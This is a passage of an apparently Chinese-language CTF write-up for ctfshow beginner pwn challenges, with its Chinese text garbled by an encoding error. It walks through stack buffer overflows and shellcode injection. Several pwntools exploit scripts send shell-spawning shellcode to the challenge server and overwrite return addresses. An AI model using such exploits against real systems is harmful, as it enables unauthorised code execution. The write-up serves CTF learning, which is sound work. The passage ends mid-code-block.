<p>32ä½ä»…éƒ¨åˆ†å¼€å¯RELROï¼Œå…¶ä»–ä¿æŠ¤å…¨å…³ï¼Œå¹¶ä¸”æœ‰å¯è¯»ï¼Œå¯å†™ï¼Œå¯æ‰§è¡Œæ®µã€‚å¯ä»¥ç”¨shellcodeã€‚</p>
<p>çœ‹ä¸åˆ°æºç ï¼Œé‚£å°±åªèƒ½çœ‹æ±‡ç¼–ä»£ç ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/198.png"
	width="620"
	height="1030"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/198_hu_ddb0945d713ff3cc.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/198_hu_d19be5ee44d7ddc0.png 1024w"
	loading="lazy"
	
		alt="NASM"
	
	
		class="gallery-image" 
		data-flex-grow="60"
		data-flex-basis="144px"
	
></p>
<p>å¤§è‡´å°±æ˜¯ï¼šä¼šè°ƒç”¨putså‡½æ•°</p>
<p>çœ‹textæ®µï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/199.png"
	width="984"
	height="558"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/199_hu_90e10171a73e5174.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/199_hu_e7ef58fcbe3b0e15.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="176"
		data-flex-basis="423px"
	
></p>
<p>è¿™é‡Œçœ‹åˆ°è°ƒç”¨getså‡½æ•°äº†ï¼Œå‚æ•°å¯¹åº”çš„æ˜¯ [ebp+s] çš„åœ°å€,ä¹Ÿå°±æ˜¯åœ¨è¿”å›åœ°å€ä¸Šä¸€æ ˆå†…å­˜å•å…ƒå¤„ï¼Œæ¥ç€å¾€ä¸‹å°±æ˜¯è°ƒç”¨putså‡½æ•°äº†ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/200.png"
	width="799"
	height="578"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/200_hu_60d7edb98ce367f7.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/200_hu_f340d09493ddcca3.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="138"
		data-flex-basis="331px"
	
></p>
<p>ç´§æ¥ç€å°±æ˜¯ctfshowå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/201.png"
	width="1074"
	height="535"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/201_hu_46ecca29bb84491b.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/201_hu_9ad4dde3c4d2423a.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="200"
		data-flex-basis="481px"
	
></p>
<p>ä»è¿™å¯çœ‹å‡ºï¼Œgetså‡½æ•°è¯»å…¥å­˜è¿›[ebp+s]è¿™å—çš„å†…å­˜ï¼Œåˆ°putsã€ctfshowä¸»å‡½æ•°éƒ½ä¼šè¯»å–å…¶ä¸­å†…å®¹è°ƒç”¨ï¼Œé‚£æˆ‘ä»¬å¾€è¿™å—æ³¨å…¥shellcodeä¸å°±å¥½äº†å—ï¼Ÿ</p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span><span class="p">,</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28118</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å½“ç„¶shellcodeè¿™éƒ¨åˆ†ä½ å¯ä»¥é€‰æ‹©æ‰‹æ•²æ±‡ç¼–ä»£ç è¿›å»ï¼Œè¿™é‡Œç”¨äº†shellcraftæ¨¡å—ã€‚</p>
<h3 id="pwn_059">PWN_059
</h3><p>é¢˜ç›®ï¼š64ä½ æ— é™åˆ¶ã€‚</p>
<p>åˆ†ææµç¨‹åŒä¸Šï¼Œéœ€è¦æ³¨æ„çš„æ˜¯åœ¨ç”Ÿæˆshellcodeçš„æ—¶å€™éœ€è¦æ³¨æ˜æ¶æ„ä¸º64ä½ï¼š</p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28204</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#recv()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn_060">PWN_060
</h3><p>é¢˜ç›®ï¼šå…¥é—¨éš¾åº¦shellcodeã€‚</p>
<p>IDA32åˆ†æï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/202.png"
	width="766"
	height="241"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/202_hu_62e54366fd6cb2ae.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/202_hu_5a8410ec937a91fe.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="317"
		data-flex-basis="762px"
	
></p>
<p>å‘ç°getså‡½æ•°ã€‚</p>
<p>ä½¿ç”¨strncpyå‡½æ•°å°†å¯¹åº”çš„å­—ç¬¦ä¸²å¤åˆ¶åˆ° buf2 å¤„ã€‚è·Ÿè¿›æŸ¥çœ‹ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/203.png"
	width="891"
	height="253"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/203_hu_8bac13b915311301.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/203_hu_c7eb78038416691f.png 1024w"
	loading="lazy"
	
		alt="bssæ®µ"
	
	
		class="gallery-image" 
		data-flex-grow="352"
		data-flex-basis="845px"
	
></p>
<p>å¯ä»¥çœ‹åˆ°buf2åœ¨bssæ®µï¼Œåœ°å€ï¼š0x804A080</p>
<p>ç”¨gdbè°ƒè¯•æŸ¥çœ‹bssæ˜¯å¦æœ‰æ‰§è¡Œæƒé™ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gdb pwn
</span></span><span class="line"><span class="cl">run
</span></span><span class="line"><span class="cl"><span class="nb">break</span> main
</span></span><span class="line"><span class="cl">vmmap
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/204.png"
	width="1169"
	height="719"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/204_hu_a7c8df1eb90cff4.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/204_hu_df2f362f2b92ed2f.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="162"
		data-flex-basis="390px"
	
></p>
<p>buf2æ‰€åœ¨çš„bsså†…å­˜æ®µç¡®å®æœ‰rwxæƒé™ï¼Œé‚£æˆ‘ä»¬ç›´æ¥æ³¨å…¥shellcodeåˆ°buf2è¿è¡Œå°±å¯ä»¥ã€‚</p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28171</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">buf2_address</span> <span class="o">=</span> <span class="mh">0x804A080</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">lenth</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="n">cyclic</span><span class="p">(</span><span class="mi">112</span><span class="o">-</span><span class="n">lenth</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">buf2_address</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä½ ä¼šçœ‹åˆ°ä¸ºä»€ä¹ˆæ˜¯112ï¼Ÿä¸åº”è¯¥æ˜¯104å—ï¼Ÿ100å­—èŠ‚+ebpæœ¬èº«çš„4å­—èŠ‚ï¼Œè¿˜æœ‰8å­—èŠ‚å“ªæ¥çš„ï¼Ÿè®°ä½ä»¥ä¸‹è§„åˆ™ï¼š</p>
<blockquote>
<p>â€œå¤šå¡«å…… 8 å­—èŠ‚â€ å¹¶ééšæ„è®¾ç½®ï¼Œè€Œæ˜¯<strong>ç”±ç¨‹åºå®é™…æ ˆå¸§ç»“æ„å†³å®šçš„</strong>â€”â€” å¯èƒ½æ˜¯ç¼–è¯‘å™¨çš„æ ˆå¯¹é½ç­–ç•¥ï¼Œä¹Ÿå¯èƒ½æ˜¯éšå¼å±€éƒ¨å˜é‡å ç”¨ç©ºé—´ï¼Œæœ€ç»ˆé€šè¿‡è°ƒè¯•ç¡®è®¤ â€œåªæœ‰å¡«å……è‡³ 112 å­—èŠ‚æ‰èƒ½è¦†ç›–è¿”å›åœ°å€â€ã€‚è¿™ä¹Ÿç¬¦åˆ PWN é¢˜çš„é€šç”¨åŸåˆ™ï¼šæ ˆæº¢å‡ºçš„å¡«å……é•¿åº¦éœ€ä»¥ â€œå®é™…è°ƒè¯• / é€†å‘ç»“æœâ€ ä¸ºå‡†ï¼Œè€Œéä»…ä¾èµ–ç†è®ºè®¡ç®—çš„ â€œç¼“å†²åŒºå¤§å° + æ—§ EBPâ€ã€‚</p>
</blockquote>
<p>ä¸è¿‡åœ¨æ–°ç‰ˆæœ¬çš„Ubuntuè™šæ‹Ÿæœºä¸­å°±å¯èƒ½ä¼šè¯¯å¯¼ä½ ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/205.png"
	width="1010"
	height="475"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/205_hu_a3b5e06235441d9b.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/205_hu_82fa9f9066716311.png 1024w"
	loading="lazy"
	
		alt="åœ¨Ubuntu24.04çš„gdbè°ƒè¯•æƒ…å†µ"
	
	
		class="gallery-image" 
		data-flex-grow="212"
		data-flex-basis="510px"
	
></p>
<h3 id="çµæ´»æŒæ§shellcodeé•¿åº¦"><strong>çµæ´»æŒæ§shellcodeé•¿åº¦</strong>
</h3><h3 id="pwn_061">PWN_061
</h3><p>é¢˜ç›®ï¼šè¾“å‡ºäº†ä»€ä¹ˆï¼Ÿ</p>
<p>checksecæŸ¥çœ‹ä¿æŠ¤ä¿¡æ¯ï¼šæ²¡æ ˆæº¢å‡ºä¿æŠ¤ã€æ²¡å¼€NXï¼Œå¯ä»¥å°è¯•æ³¨å…¥shellcodeï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/206.png"
	width="711"
	height="230"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/206_hu_50a5ab14e3ee18df.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/206_hu_bfa9c2229d230a73.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="309"
		data-flex-basis="741px"
	
></p>
<p>IDA64ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/207.png"
	width="845"
	height="321"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/207_hu_84ca861f6334ccf0.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/207_hu_2f31d5f12103b5f4.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="263"
		data-flex-basis="631px"
	
></p>
<p>æ¬¸æˆ‘ä»¬åˆ†æè¿™ä¸ªmainå‡½æ•°çœ‹åˆ°v5åœ°å€åœ¨æ¯æ¬¡ç¨‹åºè¿è¡Œéƒ½ä¼šæ‰“å°å‡ºæ¥ï¼Œä½†å› ä¸ºæ˜¯æœ‰PIEä¿æŠ¤ï¼Œæ‰€ä»¥æ¯æ¬¡åœ°å€éƒ½ä¼šéšæœºåŒ–ï¼Œæ‰€ä»¥åœ¨æ„é€ expæ—¶éœ€è¦æ¥æ”¶è¿™ä¸ªv5åœ°å€ã€‚</p>
<p>getså‡½æ•°ä¼šè¯»å–v5å‚æ•°ç„¶åå­˜å…¥å†…å­˜æ®µä¸­ã€‚</p>
<p>å¯ä»¥çœ‹åˆ°ä¼šæ‰“å°å‡ºv5åœ°å€ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/208.png"
	width="1116"
	height="754"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/208_hu_4fb289520877de27.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/208_hu_7a1fc1baba003ef0.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="148"
		data-flex-basis="355px"
	
></p>
<p>expå¤§è‡´æ€è·¯æ˜¯å…ˆè¦†ç›–ç¼“å†²åŒºï¼Œç„¶åè·³è½¬åˆ°v5åœ°å€ï¼Œæ³¨å…¥shellcodeï¼Œä½†è¦æ³¨æ„ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/209.png"
	width="775"
	height="119"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/209_hu_d06c6cfedf713d6c.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/209_hu_4219d35f69199420.png 1024w"
	loading="lazy"
	
		alt="leaveæŒ‡ä»¤"
	
	
		class="gallery-image" 
		data-flex-grow="651"
		data-flex-basis="1563px"
	
></p>
<p>è¿™é‡Œæ‰§è¡Œäº†leaveæŒ‡ä»¤ï¼Œ</p>
<p>ç­‰ä»·äºä¸¤æ¡æ±‡ç¼–æŒ‡ä»¤çš„ç»„åˆï¼š</p>
<ol>
<li><code>mov rsp, rbp</code>ï¼šå°†æ ˆæŒ‡é’ˆ <code>rsp</code>ï¼ˆæ ˆé¡¶æŒ‡é’ˆï¼‰æŒ‡å‘æ ˆåº•æŒ‡é’ˆ <code>rbp</code>ï¼Œæ­¤æ—¶ <code>rsp</code> ä» â€œ<code>v5</code> èµ·å§‹åœ°å€â€ è·³è½¬åˆ° â€œ<code>rbp</code> æ‰€åœ¨åœ°å€â€ï¼Œç›´æ¥è·³è¿‡ <code>v5</code> å ç”¨çš„æ ˆç©ºé—´ï¼›</li>
<li><code>pop rbp</code>ï¼šå°†æ ˆä¸­ <code>rbp</code> åœ°å€å¤„å­˜å‚¨çš„ â€œæ—§ RBP å€¼â€ å¼¹å‡ºåˆ° <code>rbp</code> å¯„å­˜å™¨ï¼ŒåŒæ—¶ <code>rsp</code> è‡ªåŠ¨å¢åŠ  8 å­—èŠ‚ï¼ˆ64 ä½ç³»ç»Ÿæ ˆæ“ä½œä»¥ 8 å­—èŠ‚å¯¹é½ï¼‰ã€‚</li>
</ol>
<p>v5[0]ã€v5[1]ã€æ—§rbpï¼Œå†åŠ ä¸Šé¢„ç•™ç»™shellcodeçš„è¿”å›åœ°å€çš„8å­—èŠ‚é•¿åº¦ï¼Œæ€»å…±32å­—èŠ‚ï¼Œè¿™32å­—èŠ‚ä¸èƒ½ä½¿ç”¨ã€‚ç­‰æ”¾åˆ°32ä¹‹åshellcodeçš„å†…å®¹æ‰èƒ½æ­£è¢«æ‰§è¡Œã€‚</p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28132</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;[&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">v5</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;]&#39;</span><span class="p">,</span> <span class="n">drop</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="n">v5</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">v5</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x10</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">v5</span><span class="o">+</span><span class="mi">32</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcode</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>åœ¨è¿™é‡Œè§£é‡Šä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">io.recvuntil(&#39;[&#39;)
</span></span><span class="line"><span class="cl">v5 = io.recvuntil(&#39;]&#39;, drop = True) 
</span></span><span class="line"><span class="cl">v5 = int(v5, 16)
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¾“å…¥æµä¸­é¦–å…ˆæ¥æ”¶æ•°æ®ç›´åˆ°é‡åˆ° &lsquo;[&rsquo; å­—ç¬¦ä¸ºæ­¢ã€‚æ¥ä¸‹æ¥å†æ¬¡ä»è¾“å…¥æµä¸­æ¥æ”¶æ•°æ®ï¼Œç›´åˆ°é‡åˆ° &lsquo;]&rsquo; å­—ç¬¦ä¸ºæ­¢ï¼Œå°†å…¶ä¿å­˜åœ¨å˜é‡ v5 ä¸­ã€‚æœ€åï¼Œå°†å˜é‡ v5 è§£æä¸ºä¸€ä¸ªåå…­è¿›åˆ¶çš„æ•´æ•°ï¼Œå¹¶å°†å…¶å­˜å‚¨å›å˜é‡ v5 ä¸­ã€‚</p>
<p>p64(v5+32)ï¼Œ<strong>å°† â€œv5 åœ°å€ + 32 å­—èŠ‚â€ è¿™ä¸ªç›®æ ‡åœ°å€ï¼Œæ‰“åŒ…ä¸º 64 ä½å°ç«¯åºäºŒè¿›åˆ¶æ•°æ®ï¼Œç”¨äºè¦†ç›–ç¨‹åºçš„è¿”å›åœ°å€ï¼Œæœ€ç»ˆè®©ç¨‹åºè·³è½¬åˆ°è¯¥ç›®æ ‡åœ°å€æ‰§è¡Œ shellcode</strong></p>
<blockquote>
<p>è‹¥ v5 æ˜¯å­—ç¬¦ä¸²ï¼ˆå¦‚<code>'7ffefd78ff20'</code>ï¼‰ï¼ŒPython æ— æ³•å¯¹å­—ç¬¦ä¸²è¿›è¡ŒåŠ æ³•è¿ç®—ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆéœ€è¦<code>v5 = int(v5, 16)</code>çš„åŸå› ã€‚</p>
</blockquote>
<h3 id="pwn_062">PWN_062
</h3><p>é¢˜ç›®ï¼šçŸ­äº†ä¸€ç‚¹ã€‚</p>
<p>checksecä¸€ä¸‹ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/210.png"
	width="689"
	height="224"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/210_hu_dadb37b7fe9ed49d.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/210_hu_4549a7ef4108eb50.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="307"
		data-flex-basis="738px"
	
></p>
<p>IDA64åˆ†æï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/211.png"
	width="713"
	height="325"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/211_hu_a858fbf705829cf2.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/211_hu_1b70de5939175c3f.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="219"
		data-flex-basis="526px"
	
></p>
<p>å’Œä¸Šé¢˜å·®ä¸å¤šï¼Œä½†è¿™é‡Œæ¢æˆreadå‡½æ•°äº†ï¼Œ<code>read(0, buf, 56uLL)</code>æ„æ€æ˜¯è¯»å–56é•¿åº¦çš„æ•°æ®åˆ°bufä¸­ã€‚</p>
<p>åœ¨textå­—æ®µæŸ¥çœ‹readå‡½æ•°é™„è¿‘çš„æ±‡ç¼–æŒ‡ä»¤ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/212.png"
	width="686"
	height="100"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/212_hu_38f0ce144b19f134.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/212_hu_bedfde0c9fbaa368.png 1024w"
	loading="lazy"
	
		alt="leaveæŒ‡ä»¤"
	
	
		class="gallery-image" 
		data-flex-grow="686"
		data-flex-basis="1646px"
	
>å¯ä»¥çœ‹åˆ°è¿™é‡Œå’Œä¸Šé¢˜ä¸€æ ·è°ƒç”¨å®Œreadå‡½æ•°åä¼šæ‰§è¡Œleaveæ±‡ç¼–æŒ‡ä»¤ã€‚</p>
<p>è¿è¡Œç¨‹åºä¾æ—§ä¸€æ ·ï¼Œæœ‰PIEä¿æŠ¤æƒ…å†µä¸‹ï¼Œbufåœ°å€åŠ¨æ€å˜åŒ–ã€‚</p>
<p>ä½†è¿™é‡Œæœ‰ä¸ªé—®é¢˜æ˜¯ï¼Œreadåªè¯»å–56ä½é•¿åº¦å­—ç¬¦ï¼Œ56æœ¬èº«å‡å»shellcodeåœ°å€é•¿åº¦8å­—èŠ‚ã€bufçš„16å­—èŠ‚é•¿åº¦ï¼ˆbuf[0]ã€buf[1]å„å 8å­—èŠ‚é•¿åº¦ï¼‰ä»¥åŠebpæœ¬èº«8å­—èŠ‚ï¼Œå…±32ï¼Œå³56-32=24ï¼Œé‚£å°±æ˜¯è¯´åªç•™ç»™24ä½é•¿åº¦ç»™åˆ°shellcodeçš„å†…å®¹é•¿åº¦é™åˆ¶ï¼Œpwntoolsçš„shellcraftæ¨¡å—çš„shellcodeé•¿åº¦ï¼ˆ29å­—èŠ‚ï¼‰è¶…è¿‡äº†24ã€‚å› æ­¤éœ€è¦å¦å¯»shellcodeï¼Œè¿™é‡Œæˆ‘æ¨èä¸€ä¸ªshellcodeï¼Œåˆšå¥½24å­—èŠ‚é•¿åº¦https://www.exploit-db.com/shellcodes/43550ã€‚</p>
<blockquote class="alert alert-note">
    <blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
